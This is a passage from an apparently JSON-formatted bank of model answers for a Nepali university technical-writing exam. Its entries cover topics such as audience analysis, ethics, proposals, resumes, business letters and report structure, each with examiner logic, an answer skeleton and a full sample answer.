two have confirmed enabling the option.\n\nRecommended action\n1. Withdraw the PDF and publish a corrected page 47 today.\n2. Email all 340 downloaders a notice within 24 hours.\n3. Have support help both affected customers re-enable verification.\n4. Add a security sign-off to the release checklist.\n\nI can draft the notice and corrected page within four hours; please approve."},"tw-26":{"u":6,"logic":"Five-term definition questions reward precision and an example. Vague one-liners without a use case usually earn half marks even when the term is named correctly.","how":"One line of definition plus one example per term, in the given order. Keep all five the same length so none looks forgotten.","skel":["White paper: research-based persuasive report","Usability testing: watch users attempt tasks","Stakeholder analysis: interest and power map","CMS: separates content from design","Plain language: understood on first reading"],"ans":"• White paper — an authoritative, research-based report that explains a problem and argues for a solution, to build credibility and generate leads. Example: a 12-page paper on securing remote work.\n• Usability testing — observing real users attempt real tasks with a document, site or product and recording where they fail; five users expose most problems.\n• Stakeholder analysis — identifying everyone affected by or influencing a project, with their interests and power, so communication is planned for each.\n• Content management system (CMS) — software such as WordPress that separates content from design, letting non-technical staff create, version and publish pages from a browser.\n• Plain language — writing the reader understands on the first reading: short sentences, common words, active voice. Use, not utilise."},"tw-27":{"u":12,"logic":"Two unrelated short notes, both from the ethics and reports units. Whistleblowing is often answered emotionally; the marks are for channels, evidence and protection. The second note needs the space-versus-time distinction.","how":"Half a page each. For whistleblowing: definition, why writers see it first, how to do it. For the pair: two patterns, then the one-line rule.","skel":["Whistleblowing: reporting wrongdoing to someone who can act","Internal first, then regulator; document evidence","Mechanism: parts and function, in space","Process: steps in time, with decisions","Rule: what it is made of vs what happens next"],"ans":"Whistleblowing in technical communication — reporting an organisation's wrongdoing (an unsafe product, a hidden defect or falsified data) to someone who can act, inside or outside it. The technical writer often sees it first, because documentation exposes the gap between claims and reality. Do it in writing, with evidence, internally first, then to a regulator. Expect protection under whistle-blower law.\n\nMechanism versus process description\n• Mechanism — what a thing is and how its parts work together, in space: purpose, overall description, parts and functions, principle of operation. Example: a router with a labelled diagram.\n• Process — actions in time: purpose, ordered steps, decisions, result. Example: how a router boots and obtains an IP address.\nRule: mechanism answers what it is made of; process answers what happens next."},"tw-28":{"u":2,"logic":"Repeats audience analysis in a different wording, so it rewards a prepared structure. The examiner wants the effect on content and style shown through one worked example, not listed abstractly.","how":"It repeats tw-1, so this is a sure shot: same four steps, but the example does the work. Write one system for two audiences.","skel":["Definition and why it matters","Classify primary, secondary, tertiary","Profile six factors and pick techniques","Convert profile into writing decisions","One system, two documents example"],"ans":"Audience analysis is identifying the readers of a document — who they are, what they know, what they must do — and shaping content, style and format to fit them. Without it a technically correct document fails, because it answers questions the reader never asked.\n1. Classify readers: primary (act on it), secondary (advise or approve), tertiary (incidental).\n2. Profile them: knowledge level, role, needs, attitude, reading context, constraints.\n3. Use techniques: reader persona, interviews, surveys, usability tests, past support tickets, subject experts.\n4. Convert the profile into decisions about content, vocabulary, depth, examples and medium.\n\nExample: one campus result system is documented twice. For students, a one-page web guide: log in with your campus email, open Results, choose semester — screenshots, a Nepali summary, mobile layout, no technical terms. For exam-section staff, a procedural manual with database fields, error codes, the rollback step and the escalation contact, on the intranet. Same fact, different depth, vocabulary and medium, and the audience decides all three."},"tw-29":{"u":4,"logic":"A full business letter with an enclosure list. The examiner checks letter parts, a clear request, credible specifics and a polite close; a memo or an email format loses marks immediately.","how":"Use full block letter form: sender, date, inside address, subject, salutation, three paragraphs, close, enclosures. Put the price list in bullets.","skel":["Sender address, date, inside address","Subject line naming the request","Who you are and what you ask","Specifications and itemised costs","Accountability, close, enclosures"],"ans":"House No. 14, Kupondole, Lalitpur\n12 November 2082\nThe Chief District Officer\nDistrict Administration Office, Lalitpur\n\nSubject: Request for permission to collect donations for a school computer lab\n\nDear Sir/Madam,\n\nI am a sixth-semester B.Sc. CSIT student at [Campus], Lalitpur. I wish to donate twelve computers to Shree Janata Secondary School, where I studied, and request your permission to collect public donations for this purpose from 1 December to 31 January.\n\nMost community schools in Nepal have one or two working computers for hundreds of students. This donation would give the school a 12-seat lab for its computer science classes.\n\nSpecifications and estimated cost per unit: Intel Core i3, 8 GB RAM, 256 GB SSD, 19-inch monitor, keyboard and mouse — Rs 42,000. Twelve units: Rs 5,04,000. Networking, UPS and installation: Rs 60,000. Total: Rs 5,64,000.\n\nDonations will be receipted, held in a separate account and audited by the campus, and a completion report will be sent to your office.\n\nI shall be grateful for your approval.\n\nYours faithfully,\n[Name], [Phone], [Email]\nEnclosures: school recommendation letter; two price quotations"},"tw-30":{"u":7,"logic":"Tests report architecture as a reader service. Listing parts earns half marks; the rest comes from explaining what each part does for a reader who is searching, not reading.","how":"Three blocks: front matter, body, back matter. One line per part with its job, then a short paragraph on effectiveness.","skel":["Front matter: title, contents, summary","Body: introduction with scope and method","Findings, conclusions, recommendations","Back matter: references, appendices, glossary","Effectiveness: selective reading, credibility"],"ans":"A technical report has a fixed architecture because readers do not read it front to back; they hunt for a section.\nFront matter: title page, letter of transmittal, table of contents, list of figures and an executive summary, which alone lets a manager decide in two minutes.\nBody:\n• Introduction — background, problem, purpose, scope, limitations, method.\n• Findings — evidence under headings, with tables and figures.\n• Conclusions — what the evidence shows, with no new material.\n• Recommendations — specific, actionable, prioritised and costed.\nBack matter: references, appendices for raw data and questionnaires, glossary and index.\n\nWhy it works: a predictable location saves search time; the summary and recommendations serve decision-makers; appendices keep detail available without bloating the body; references make claims checkable; headings allow selective reading; and a stated limitation builds credibility. A 40-page evaluation with no executive summary is read by nobody, so structure is how the report gets used, not a formality."},"tw-31":{"u":12,"logic":"The third ethics question in this paper, so it rewards a compact reusable frame. It asks for considerations plus a method of adherence, and the method is where most answers stop short.","how":"Repeats tw-16 and tw-6, so it is a sure shot. Use the same eight values, then six adherence actions in imperative verbs.","skel":["Accuracy and honesty in graphs","Disclose risk, uncertainty, limitations","Confidentiality, credit, fairness","Follow code, keep records, get sign-off","Escalate in writing, refuse to sign"],"ans":"Ethical considerations in technical writing are the duties a writer owes the reader, the subject and the public.\n• Accuracy — no invented data, no unverified specifications, no quietly dropped inconvenient results.\n• Honesty in presentation — graphs start at zero; no truncated axes, cherry-picked periods or 3-D distortion.\n• Completeness — known risks, side effects and limitations disclosed, not buried.\n• Safety — warnings placed before the step they guard, in plain words, with the consequence stated.\n• Confidentiality and privacy — protect client data, test credentials and personal information.\n• Credit — quote and cite sources; no plagiarism.\n• Fairness — balanced evaluation of alternatives, and no hidden conflict of interest.\n\nHow to adhere: follow a written code of conduct; keep a factual record; get technical review sign-off; write warnings the reader can act on; escalate in writing when asked to mislead; refuse to sign what you cannot defend; and treat the reader's safety as the final test of every sentence."},"tw-32":{"u":6,"logic":"Tests whether you can define a web genre and then write in it. The five FAQs must sound like real user questions with usable answers, not marketing statements.","how":"One-line definition, then exactly five numbered FAQs with a question in the user's voice and a 40-60 word answer. Keep the fifth about data or trust.","skel":["Define FAQ as user-worded answers","Five real questions, numbered","Each answer actionable in 60 words","Link to the full topic","Keep updated from support tickets"],"ans":"An FAQ is a page that answers the questions users actually ask, in their own wording, so they can solve a problem without contacting support.\n\nFive FAQs for [Company]\n1. How do I reset my password?\nClick Forgot password, enter your email, open the link within 30 minutes; check spam.\n2. Do you offer a free trial?\nYes — 30 days, all features, no card required.\n3. Can I use the service on my phone?\nYes; the site is responsive and the Android app is on the Play Store.\n4. How do I request a refund?\nEmail billing@[domain] within 14 days with your invoice number; refunds take seven days.\n5. Is my data stored in Nepal?\nYes, in Kathmandu with daily backups; export or delete it at any time."},"tw-33":{"u":5,"logic":"Probes whether you can both define a scheduling graphic and actually produce one. The drawing carries the marks, and weak answers define the chart and never draw it.","how":"One-line definition, then a week-by-week grid with proportional bars and a milestone diamond. The drawing is half the marks.","skel":["Define: bar chart of tasks over time","Tasks as rows, weeks as columns","Bars proportional, overlaps allowed","Mark submission as a milestone","One line on why it helps a writer"],"ans":"A Gantt chart is a horizontal bar chart that schedules work: tasks are listed down the left, calendar time runs across the top, and each task gets a bar whose length equals its duration. Overlapping bars show parallel work; a diamond marks a milestone.\n\nGantt chart — my Technical Writing assignment (4 weeks)\n\nTask                         Wk1  Wk2  Wk3  Wk4\nChoose topic and audience    ███\nLibrary and web research        █████\nOutline and first draft              █████\nPeer review and feedback                  ███\nRevise, copyedit, proofread                  ███\nDraw figures and tables                      ███\nPrint and submit                          ◆ day 28\n\nReading it: every bar is proportional to its duration, no bar starts before the task it depends on, and the run along the week 3–4 line is the critical path — if peer review slips a week, submission slips with it. That is why a writer schedules review and production time, not only writing time."},"tw-34":{"u":4,"logic":"Tests whether you can apply the four AIDA moves in order to a real product instead of reciting the acronym. Examiners look for the labels and a genuine single call to action.","how":"Label A-I-D-A in the margin, one short block each, ending in one clear action. The labels themselves earn marks.","skel":["Subject line that earns attention","Interest: one concrete user problem","Desire: benefit plus evidence","Action: one specific easy step"],"ans":"Persuasive message in AIDA order — launch of “Kharcha”, a personal budgeting app\n\nSubject: Your salary can last the whole month — starting today\n\nAttention. Last Asar, three of every four salaried people we spoke to in Kathmandu ran out of money before the month did. If that sounds familiar, read on.\n\nInterest. Kharcha records a spend in two taps, sorts it into food, rent, transport and data, and shows one number — what is left until payday. It works offline and reads Nepali and English bank SMS.\n\nDesire. People who tracked for one month cut unnecessary spending by about a fifth and finally saw where the money went. No spreadsheet, no accountant, no fee for the first year.\n\nAction. Install Kharcha free from Play Store today, add your first expense and set one savings goal. Reply to this message and we will send a ten-minute setup guide."},"tw-35":{"u":7,"logic":"Checks that you know the executive summary is a decision tool rather than an introduction, and that you can state its contents, placement and length.","how":"Purpose first, then five bullet purposes, then placement and length. The placement and length line is the easy mark.","skel":["One-page condensation for decision-makers","Contents: problem, work, findings, recommendation","Five purposes as bullets","Placement after contents page","5–10 per cent, never more than two pages"],"ans":"An executive summary is a one-page condensation of a whole technical document, written for the reader who decides rather than reads: a manager, client or funding body. It states the problem, what was done, the main findings, the conclusion and any recommendation, in that order, in plain language, with no new information.\n\nIts purposes:\n• Decision support — a busy executive can approve, reject or fund the work from one page.\n• Orientation — tells every reader what the document contains and whether to read on.\n• Stand-alone use — it is often detached and circulated without the report, so it must make sense alone.\n• Screening — readers of proposals and reports shortlist on the summary.\n• Quality control — if the summary cannot be written clearly, the report's argument is not clear either.\n\nPlacement: after the title page and table of contents, before the introduction. Length: about 5–10 per cent of the document, never more than two pages. Past tense for work done, present tense for conclusions."},"tw-36":{"u":1,"logic":"Tests whether you can separate technical writing from creative, academic and journalistic writing on purpose, audience, tone, structure and success test — not merely define it.","how":"Hold a five-row comparison in mind, write one contrast per row, and finish with one example of each kind.","skel":["Purpose and audience first","Tone: objective versus personal","Structure: headings and lists","Success test: task completed","One example of each form"],"ans":"Technical writing communicates specialised information to a defined audience for a practical purpose. It differs from other writing on five axes:\n\n• Purpose — technical informs, instructs or persuades to action; creative writing entertains; academic writing argues and adds knowledge; journalism informs and attracts.\n• Audience — technical has a named, often non-expert reader; creative a general reader; academic specialists; journalism the mass public.\n• Tone — technical is objective and neutral, never “I feel”; creative personal and emotional; academic formal and analytical; journalism lively.\n• Structure — technical uses headings, lists, tables and numbered steps; creative is free-form; academic follows IMRaD; journalism the inverted pyramid.\n• Success test — a technical document works only if the reader completes the task; a poem if the reader feels; a paper if peers accept it; an article if it is read.\n\nLanguage stays plain, jargon defined once. Examples: a router manual, a poem about rain, a paper on routing algorithms, a news story on internet shutdowns."},"tw-37":{"u":8,"logic":"Tests whether you know the two resume layouts as strategies for different careers, and can say when each is the right choice rather than only how they look.","how":"Two columns: content, order, best for, weakness. Finish with the hybrid, which is what most candidates actually send.","skel":["Chronological: reverse-time job history","Functional: skills clusters, dates hidden","Chronological shows continuity, exposes gaps","Functional hides gaps, raises suspicion","State the best use case for each"],"ans":"Both are one-page summaries of a candidate's suitability; they differ in what they put first.\n\nChronological resume\n• Organised by job title and employer, most recent first, each with dates.\n• Shows steady growth and continuity; it is the recruiter's default and the most ATS-friendly.\n• Best for a candidate with an unbroken, relevant work history.\n• Weakness: gaps, job-hopping or a career change become visible at once.\n\nFunctional (skills-based) resume\n• Organised by skill clusters — “Network administration”, “Technical support” — with achievements under each; dates appear only in a short work-history line.\n• Hides gaps and repetition and highlights transferable strength.\n• Best for freshers with projects, career changers, people returning after a break, freelancers.\n• Weakness: recruiters suspect it hides something, and some ATS rank it lower.\n\nMost candidates now send a combination: a skills summary on top, then a short reverse-chronological history."},"tw-38":{"u":3,"logic":"Checks that you know the process as ordered stages with actual work in each, and that revision is recursive rather than one proofread at the end.","how":"Name the five stages in order, one line of work each, then add the feedback loop. That loop is the discriminator.","skel":["Planning: audience, purpose, research, outline","Drafting: fast, no editing","Revising: content, order, accuracy","Copyediting: grammar, consistency, style","Publishing: format, distribute, feedback"],"ans":"Technical writing follows five recursive stages, not a straight line:\n\n1. Planning — analyse audience and purpose, define scope, research and gather data, choose the medium, outline, and set a schedule.\n2. Drafting — write fast against the outline; do not edit sentences while drafting; leave [TK] placeholders for missing figures.\n3. Revising — big picture: is the content complete, accurate, in the right order and at the right level for this reader? Cut whole sections if needed.\n4. Copyediting — sentence level: grammar, punctuation, spelling, terminology, consistency, wordiness, house style; then proofread the formatted pages.\n5. Publishing — design and format, obtain sign-off, distribute, archive, and collect reader feedback for the next version.\n\nThe loop is the point: feedback at stage 5 sends you back to stage 1. Name each stage, say what happens in it, and give one workplace artefact — outline, redline, style sheet, release note."},"tw-39":{"u":3,"logic":"Probes whether you see review as a quality and safety control rather than a courtesy. Strong answers give both why it matters and how to run one.","how":"Define in one line, list five reasons, then three sentences on running a review. The how half is usually missed.","skel":["Colleague reviews draft before publication","Catches errors the writer cannot see","Tests usability and audience fit","Protects safety and credibility","How: brief, ask, resolve, close loop"],"ans":"Peer review is a review of a draft by a colleague who knows the subject but did not write it, carried out before the document reaches its real audience.\n\nWhy it matters:\n• Catches errors the writer cannot see — a wrong port number, a stale screenshot, an unsupported claim.\n• Tests usability — can a competent outsider follow the steps and reach the same result?\n• Checks audience fit — the reviewer asks the questions a real reader will ask.\n• Enforces consistency of terminology, format and style across sections and authors.\n• Protects credibility and safety — a wrong instruction in a manual or a policy can injure or mislead.\n• It is cheap early: a two-hour review saves a recall, a support ticket or a public retraction.\n\nHow to run one: give the reviewer the brief, not just the file; ask specific questions such as “can you install it from section 3 alone?”; record comments in the document; agree who resolves disagreements; and tell the reviewer what you changed."},"tw-40":{"u":7,"logic":"Tests a distinction students blur: a definition fixes meaning, a description explains structure and operation. Examiners want the different question each one answers.","how":"Open with the question each answers, give one example of each, then show the two working together in a manual.","skel":["Definition answers what X is","Class plus differentiating feature","Description answers what it consists of","Spatial or functional organisation","Manual example: define, then describe"],"ans":"A definition fixes what a term means; a description explains what a thing is like. They answer different questions.\n\nTechnical definition\n• Answers “What is X?” — class plus differentiating feature: “A router is a network device that forwards packets between networks.”\n• One sentence (formal), one paragraph (informal), or extended with examples, analogy and history.\n• Used when a term first appears, in a glossary, or when the reader's meaning may differ from yours.\n\nTechnical description\n• Answers “What does X consist of, and how does it work?” — parts, materials, functions, principle of operation.\n• Longer; organised spatially (outside to inside, left to right) or functionally, part by part.\n• Uses a labelled diagram, a parts list with functions, and often a process description of operation.\n\nRelation: the definition opens, the description follows. A manual defines “UPS” in one line, then describes its front panel, battery, inverter and changeover behaviour. Definition is a sentence about meaning; description is a page about the object."},"tw-41":{"u":1,"logic":"A glossary check: five terms drawn from different units, testing whether you can define precisely in a line or two instead of writing a paragraph of vague prose.","how":"One term, one sentence, one use. Five lines of twenty words beat five paragraphs of filler.","skel":["Pilot study: small trial of the instrument","Clinical research: phased trials in humans","Alignment: consistent placement on a line","Stakeholder: anyone affected or affecting","Rehearsing: timed, out-loud practice"],"ans":"• Pilot study — a small-scale trial run of a questionnaire, interview or procedure on a few representative users, to test wording, order and timing before the full study; its data are not used as findings.\n• Clinical research — systematic study of health interventions in human subjects, run in defined phases, to establish safety and efficacy before a treatment is licensed.\n• Alignment — the placement of text and graphics on a consistent vertical or horizontal line; left-aligned, ragged-right body text is the most readable both in print and on screen.\n• Stakeholder — any person or group affected by, or able to affect, a document, project or decision: the reader, the approver, the regulator, the user, the funder.\n• Rehearsing — timed, out-loud practice of a presentation, covering the opening, transitions and likely questions, to fix pace, wording and slide changes before delivery."},"tw-42":{"u":3,"logic":"Two short notes from different units — editing craft and workplace ethics — testing whether you can compress each to its defining features plus one example.","how":"Give each note a definition line, four features and one workplace example. Keep the two notes equal in length.","skel":["Copy editing: sentence-level correction","Grammar, style, consistency, concision","Not revision, not proofreading","Whistleblowing: reporting wrongdoing","Last resort, public interest, protected"],"ans":"Copy editing\n• The sentence-level stage of revision: grammar, punctuation, spelling, capitalisation, tense, subject–verb agreement, consistent terminology and units, house style, and cutting wordiness.\n• Done after the content is settled, never while drafting.\n• Tools: a style sheet, the house style guide, spell-check plus a human read, reading aloud, a second pair of eyes.\n• It does not restructure the argument — that is revision's job; proofreading is the later check of the typeset pages.\n\nWhistleblowing\n• Reporting a genuine wrongdoing — illegality, danger to public safety, fraud, a cover-up — by a member of the organisation to someone who can act: senior management, a regulator, a journalist.\n• A last resort, after internal channels fail; the motive must be public interest, not revenge.\n• Protected in law in many countries when the disclosure is made in good faith; retaliation is the main risk.\n• In technical writing it means refusing to sign off false safety documentation, or reporting a data breach you have discovered."},"tw-43":{"u":11,"logic":"A full internal proposal under a scenario: it tests structure (problem, objectives, options, findings, cost, schedule, approval) and the discipline of a justified single recommendation.","how":"Memo header, then problem, objectives, a three-model table, findings, recommendation with total cost, and a 12-day schedule.","skel":["Header and problem statement","Four measurable objectives","Three-model table with prices","Findings and justified choice","Total cost, timeline, approval request"],"ans":"PROPOSAL: Five laptops for the Operations Department\nTo: Manager, National Bank of Nepal, Kathmandu   From: IT Expert   Date: 12 Mangsir 2082\n\n1. Problem. Five operations staff share three six-year-old desktops. Boot takes four minutes, the core banking client crashes during end-of-day posting, and Windows 10 support has ended — a security and audit risk.\n\n2. Objectives. Buy five business laptops that (a) run the core banking client and Office smoothly, (b) meet the bank's endpoint-security policy, (c) cost under NPR 1,00,000 each, (d) last four years.\n\n3. Options (dealer survey, Kathmandu, Asar 2082):\nModel                 CPU / RAM / SSD          Price NPR   Warranty\nDell Latitude 3450    i5-1335U / 16GB / 512GB    96,500    3 years\nHP ProBook 450 G10    i5-1334U / 16GB / 512GB    92,000    1 year\nLenovo ThinkPad E14   i5-1335U / 16GB / 512GB    98,000    3 years\n\n4. Findings. All three handle the workload. HP is cheapest, but a two-year warranty extension adds about NPR 9,000. ThinkPad has the best keyboard and spill resistance; Dell is cheapest to service locally with next-day support.\n\n5. Solution and cost. Five ThinkPad E14 at NPR 98,000 = NPR 4,90,000, plus docking stations and cases NPR 35,000; total NPR 5,25,000 including VAT.\n\n6. Time. Approval this week, delivery in 7 days, imaging, domain join and handover in 3 days — all staff working on new machines within 12 days.\n\nApproval requested for NPR 5,25,000."},"tw-44":{"u":3,"logic":"The same process question as the 5-mark version, but 10 marks demands illustration: stages, recursion, and a worked workplace example carried through all five.","how":"Five stages, one paragraph each with an IT example, then draw the loop. This repeats tw-38, so it is a sure shot.","skel":["Five stages named in order","Work content of each stage","Recursive loop back to planning","IT example through all five","Draw boxes with a feedback arrow"],"ans":"Writing technical documents follows five stages, and the loop between them is the point.\n\n1. Planning — audience, purpose, scope, medium, research, outline, schedule. Roughly half the effort belongs here.\n2. Drafting — write the whole document fast from the outline; no sentence polishing; placeholders for missing data.\n3. Revising — content level: accuracy, completeness, order, level of detail, tone. Add, cut, move.\n4. Copyediting — surface level: grammar, spelling, punctuation, consistency, style sheet; then proofread the formatted pages.\n5. Publishing — design, sign-off, distribution, archiving, feedback.\n\nExample from IT: a user manual is planned around three reader types, drafted from the feature list, revised after a subject-matter expert finds two wrong menu paths, copyedited to one term for “login”, then published as PDF and HTML and revised again after support tickets.\n\nDraw five boxes with a feedback arrow from Publish back to Plan, and say why: the readers' questions are the next edition's requirements."},"tw-45":{"u":2,"logic":"Tests written feedback as a genre: specific, balanced, evidence-based and addressed to the author — not a summary of the vlog's topic or empty praise.","how":"Three headings: what I learned, where my experience differs, suggestions. Quote the vlog's own examples and end with one ask.","skel":["Open with the vlog and its title","What it taught beyond the lecture","Where your experience differs","Three specific suggestions","One closing action for the author"],"ans":"“Blocked mind as a malfunction of communication” — feedback on your vlog\nTo: [peer]   From: [me]   Re: vlog episode 3\n\nWhat the vlog taught me that the classroom did not\nYour example of the student who stayed silent through a whole project meeting and later admitted he had not understood the brief made the idea concrete. From the lecture I had “psychological noise” as a label; from your vlog I got the mechanism — fear of looking foolish blocks the question, the question is never asked, and the work goes wrong for a week. Your second point, that a blocked mind often looks like agreement, was new to me.\n\nWhere my experience differs\nYou present unblocking as a personal decision to speak. In my internship the block was structural: our daily stand-up was held in English in front of seniors, and nobody asked anything. What unblocked it was a written channel — a shared sheet where questions could be posted without a name. Two of the best questions that month came from that sheet.\n\nSuggestions\n• Cut the three-minute title sequence; the argument starts at 3:40.\n• Add captions — the audio drops in the second half.\n• Show the diagram while you explain it, not afterwards.\n• End with one action: ask the question in the first five minutes.\n\nOverall the content is strong and the examples work. Tighten the edit and this is worth sharing with the whole class."},"tw-46":{"u":5,"logic":"Checks that you can define graphics and then justify them functionally. The marks sit in the uses and the design rules, not in the definition.","how":"Define in two lines, then seven uses as bullets, then the design rules, then one chart-choice example at the end.","skel":["Definition: visual representation of information","Uses: trend, comparison, process, instruction","Persuasion and record-keeping","Rules: label, scale, caption, source","Same data as table, bar and line"],"ans":"Graphics are visual representations of information — tables, graphs, diagrams, maps, photographs, icons — used with or instead of prose to show what words describe slowly.\n\nHow they are used in technical writing:\n• To show relationships prose hides — a line graph makes a three-year trend visible at a glance.\n• To compare — bar charts compare categories; tables give exact values for many variables.\n• To show process and structure — flowcharts for decision logic, schematics for mechanisms, labelled diagrams for parts.\n• To instruct — numbered screenshots and callouts in a manual; a photograph of the correct cable connection.\n• To summarise — an infographic or one-page dashboard replaces two pages of numbers.\n• To persuade — a cost-comparison chart in a proposal does more than a paragraph of adjectives.\n• To record — site maps, Gantt charts and organisation charts document a plan.\n\nRules that earn marks: one message per graphic; the right type for the data; labelled axes with units; scale from zero on bars; no 3-D distortion; a self-contained caption and source; accessible alt text and colour-blind-safe palettes. Example: the same rainfall figures as a table, a bar chart or a line graph — choose by whether the reader needs exact values, a comparison, or a trend."},"tw-47":{"u":1,"logic":"Tests the academic-versus-technical distinction specifically. Since tw-36 covers creative and journalistic writing, this answer must stay on academic writing and citation.","how":"Seven contrast pairs, one line each, then the same-project example. It repeats tw-36, so it is close to a sure shot.","skel":["Reader: user versus examiner","Purpose: act versus argue","Structure: headings versus IMRaD","Language: plain versus nominalised","One project, two documents"],"ans":"Technical writing and academic writing both respect evidence; they differ in reader, purpose and form.\n\n• Reader — technical writing targets a known user who must act; academic writing targets examiners and specialists who must be convinced.\n• Purpose — technical informs, instructs or recommends; academic argues a thesis and contributes knowledge.\n• Structure — technical uses headings, bullets, tables, numbered steps, front matter and an executive summary; academic uses IMRaD, continuous prose and formal citation throughout.\n• Language — technical is plain, second person, active, short sentences, with jargon defined; academic is impersonal, nominalised and hedged.\n• Evidence — technical cites standards, test results and vendor data; academic cites literature and theory.\n• Success test — the reader completes the task, versus the argument surviving peer scrutiny.\n• Life — a technical document is versioned and retired; a paper is fixed and archived.\n\nExample: the same database work appears as a two-page installation guide for the IT team and a twelve-page paper on indexing strategies for a journal."},"tw-48":{"u":12,"logic":"Probes whether you can define plagiarism beyond copying — paraphrase, self-plagiarism, code, images — and argue why honesty is structural rather than decorative.","how":"Define with four forms, then five reasons honesty matters, then five habits that prevent it. The habits are easy marks.","skel":["Definition and four forms","Legal and academic offence","Credibility is the writer's asset","Reader acts on the claim","Prevention: cite, log, check licence"],"ans":"Plagiarism is presenting another person's words, ideas, data, images or code as your own — copying verbatim without quotation and citation, close paraphrase that keeps the original structure, reusing your own published work without acknowledgement, or submitting work written by someone else.\n\nWhy we must stay honest:\n• It is theft of intellectual labour, and both copyright law and university rules treat it as an offence.\n• It destroys the one asset a technical writer has — credibility. One unverified copied claim casts doubt on every other claim.\n• It misleads the reader, who acts on the document believing it was checked.\n• It cheats the assessment: a plagiarised report earns a mark the candidate cannot defend in a viva.\n• In industry it creates legal liability through copied code, diagrams and specifications.\n\nHow to stay honest: paraphrase and then cite; quote with quotation marks and a page number; keep a source log while reading; check the licence before reusing an image; run a similarity check before submitting."},"tw-49":{"u":4,"logic":"A routine good-news email: it tests the discipline of a specific subject line, a purpose sentence, an organised body and one clear request, inside correct email layout.","how":"Subject with event and dates, purpose in line one, four labelled paragraphs, then the exact approvals needed. Close with contact details.","skel":["Subject with event and dates","Purpose sentence in line one","Venue, participants, logistics, publicity","Two approvals requested explicitly","Sign-off with designation and phone"],"ans":"To: rajesh.adhikari@campus.edu.np\nCc: it-fair-committee@campus.edu.np\nSubject: IT Fair, 5–6 Mangsir — arrangements confirmed\nAttachments: floor-plan.pdf, budget.xlsx\n\nDear Mr Adhikari,\n\nThe arrangements for the campus IT Fair on 5–6 Mangsir are now in place. This mail confirms them so that you can approve the two items in the last paragraph.\n\nVenue and layout. The fair will be held in the Block B hall and the adjoining corridor. The attached plan places 22 stalls, a demo stage for the robotics club, and a separate power line for the hardware stalls.\n\nParticipants. Fourteen companies and eight student projects have confirmed. Registration closed on 28 Kartik with 22 stalls booked; three names are on the waiting list.\n\nLogistics. Internet: a 100 Mbps link installed by WorldLink on 2 Mangsir. Power: two 5 kVA generators booked as backup. Furniture and signage arrive on 4 Mangsir, so the hall will be closed for setup that afternoon.\n\nPublicity. Posters are up in all departments, the notice is on the campus website and Facebook page, and two local dailies will carry the press note on 4 Mangsir.\n\nTwo approvals needed: NPR 45,000 for generator fuel and security, and permission to close the Block B car park on both days. Please confirm and I will release the purchase order.\n\nSincerely,\nSita Sharma\nIT Fair Coordinator · 9812345678"},"tw-50":{"u":6,"logic":"Tests planning rather than decoration: can you list the decisions taken before a page is designed — audience, task, hierarchy, accessibility, performance?","how":"Group into content, structure, layout, accessibility, performance and maintenance — eight bullets, then one example page.","skel":["One page, one task, one audience","Content hierarchy and above the fold","Navigation, grid, responsive breakpoints","Accessibility, contrast, alt text","Speed, SEO, maintenance"],"ans":"Planning a web page is an information and audience decision before it is a visual one. A designer must settle:\n\n• Purpose and audience — the single task the page does, who arrives, from where, on what device and connection.\n• Content hierarchy — the key message above the fold, chunked sections, meaningful headings.\n• Navigation — where the page sits, breadcrumbs, consistent global navigation, a way back.\n• Layout — a readable measure of 60–75 characters, white space, no horizontal scroll, defined breakpoints.\n• Typography and colour — 16px minimum body text, sans-serif on screen, contrast of at least 4.5:1, colour never the only signal.\n• Accessibility — alt text, keyboard order, form labels, captions, nothing that autoplays.\n• Performance and SEO — image weight, page speed, title tag, meta description, clean URLs, correct heading order.\n• Trust and maintenance — contact details, privacy notice, secure forms, and a named owner for updates.\n\nExample: a campus admission page is planned around one task — apply — with the deadline and the Apply button above the fold."},"tw-51":{"u":8,"logic":"Tests whether you can produce an ATS-friendly one-page resume tailored to a foreign advert, with quantified achievements and an honest work-authorisation line.","how":"Contact, profile, experience with numbers, education, skills, then the sponsorship line. Quantify at least three bullets.","skel":["Contact block with LinkedIn","Two-line profile with one number","Experience: verb, task, result","Education, skills, certification","Work authorisation statement"],"ans":"SITA SHARMA\nKathmandu, Nepal · sita.sharma@email.com · +977-98XXXXXXXX · linkedin.com/in/sitasharma\nIT Officer — infrastructure, security and user support\n\nPROFILE\nIT graduate (B.Sc. CSIT, Tribhuvan University) with three years supporting 120-user networks, Windows Server and cloud identity. Cut repeat support tickets by 40 per cent by rewriting the onboarding process.\n\nEXPERIENCE\nIT Support Officer, Himalayan Solutions Pvt. Ltd., Kathmandu — 2022 to present\n• Administer Windows Server 2019, Active Directory and 120 endpoints; maintain 99.5 per cent uptime.\n• Migrated 90 mailboxes to Microsoft 365 with zero data loss in a single weekend cutover.\n• Wrote the IT onboarding guide now used for every new hire, cutting setup time from two days to four hours.\nIT Intern, Nabil Bank — 2021\n• Audited 60 workstation configurations against the security baseline and closed 18 findings.\n\nEDUCATION\nB.Sc. Computer Science and Information Technology, Tribhuvan University — 2021, 72 per cent\n\nPROJECT\nCampus network redesign: VLAN segmentation and firewall rules for 300 users.\n\nSKILLS\nWindows Server, Active Directory, Microsoft 365, TCP/IP, pfSense, Python, Power BI, ITIL basics\n\nCERTIFICATIONS\nGoogle IT Support Professional; Cisco CCNA (in progress)\n\nWork authorisation: require H-1B sponsorship."},"tw-52":{"u":2,"logic":"An opinion question with a communication-studies core: examiners want a reasoned yes, the points of difference, and what actually makes cross-cultural friendship work.","how":"Answer yes in line one, then what is the same, what differs, what makes it work, and one concrete personal example.","skel":["Yes, but built deliberately","Same foundations: trust, time, honesty","Differences: style, time, boundaries, humour","Ask, explain, apologise, stay curious","One personal example"],"ans":"Yes — friendship across cultures can be as strong as within one, but it is built differently and needs more deliberate work.\n\nWhat is the same: trust, reciprocity, honesty, time spent and promises kept. A friend is still someone who shows up.\n\nWhat differs:\n• Communication style — direct or indirect; what is friendly teasing in one culture is an insult in another.\n• Time and obligation — a dinner invitation may be a firm commitment or a suggestion.\n• Boundaries — religion, politics, money, family and personal space follow different rules.\n• Shared references — food, festivals and humour are missing at first, so jokes need explaining.\n• Family — in Nepal a friendship often includes the family; elsewhere it may stay individual.\n• Silence and “yes” — a polite yes may mean “I heard you”, not “I agree”.\n\nWhat makes it work: ask instead of assuming, explain your own customs, apologise quickly when you misread a signal, avoid ethnic jokes, stay curious. My closest friend at campus is from Madhesh; we disagree about festivals and food and still help each other before every exam. The friendship is not weaker for the differences — it is more explicit, because nothing is taken for granted."},"tw-53":{"u":7,"logic":"A news story to house style: headline, dateline, a lead carrying the five Ws, attributed quotes, context and a boilerplate — the inverted pyramid 